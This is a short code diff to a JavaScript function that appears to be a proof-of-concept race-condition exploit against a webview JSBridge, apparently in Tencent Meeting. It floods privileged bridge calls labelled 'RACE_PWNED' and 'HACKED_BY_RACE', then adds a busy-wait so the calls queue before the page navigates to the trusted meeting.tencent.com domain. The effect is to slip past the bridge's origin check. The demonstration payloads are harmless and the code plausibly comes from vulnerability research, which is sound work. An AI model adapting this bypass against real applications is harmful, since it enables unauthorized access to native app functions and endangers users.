@@ -30,24 +30,28 @@ function doRace() {
     addLog('URL: ' + location.href);
 
     // 批量发送 ShowToast（带明显标识文字）
-    for (var i = 0; i < 10; i++) {
+    for (var i = 0; i < 20; i++) {
         callJSBridge('UIPlugin', 'ShowToast', {
             content: 'RACE_PWNED_' + i,
-            duration: 3000,
+            duration: 5000,
             type: 0
         });
     }
-    addLog('Sent 10x ShowToast');
+    addLog('Sent 20x ShowToast');
 
-    // 也发几个 SetTitle 作为备选验证
-    for (var i = 0; i < 5; i++) {
+    // 也发 SetTitle
+    for (var i = 0; i < 10; i++) {
         callJSBridge('CommonPlugin', 'SetTitle', {
-            title: 'HACKED_BY_RACE'
+            title: 'HACKED_BY_RACE_' + i
         });
     }
-    addLog('Sent 5x SetTitle');
+    addLog('Sent 10x SetTitle');
 
-    // 立刻 navigate 到合法域名
+    // 延迟 200ms 再 navigate，给 IPC 消息时间入队
+    addLog('Waiting 200ms for IPC to queue...');
+    var start = Date.now();
+    while (Date.now() - start < 200) {} // busy wait，不用 setTimeout（会被 navigate 取消）
+
     addLog('Navigating to meeting.tencent.com...');
     window.location.href = 'https://meeting.tencent.com/';
 }
